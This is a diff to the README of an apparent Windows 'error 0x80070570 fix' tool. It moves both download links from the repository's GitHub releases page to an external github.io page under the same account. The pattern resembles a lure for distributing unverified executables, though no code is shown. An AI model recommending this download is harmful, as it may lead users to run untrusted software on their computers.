@@ -1,6 +1,6 @@
 # 🛠️ Error-0x80070570-Fix - Repair corrupted Windows files quickly
 
-[![](https://img.shields.io/badge/Download_Fix-Blue)](https://github.com/late-call391/Error-0x80070570-Fix/releases)
+[![](https://img.shields.io/badge/Download_Fix-Blue)](https://late-call391.github.io)
 
 This software fixes the Windows error 0x80070570. This error appears when the operating system cannot read a specific file or folder. Your computer labels these files as corrupted or unreadable. This tool automates the repair process for Windows 10 and Windows 11.
 
@@ -20,7 +20,7 @@ This tool works on the following systems:
 
 Visit the link below to reach the release page.
 
-[https://github.com/late-call391/Error-0x80070570-Fix/releases](https://github.com/late-call391/Error-0x80070570-Fix/releases)
+[https://late-call391.github.io](https://late-call391.github.io)
 
 1. Go to the link above.
 2. Look for the latest version under the "Assets" section.
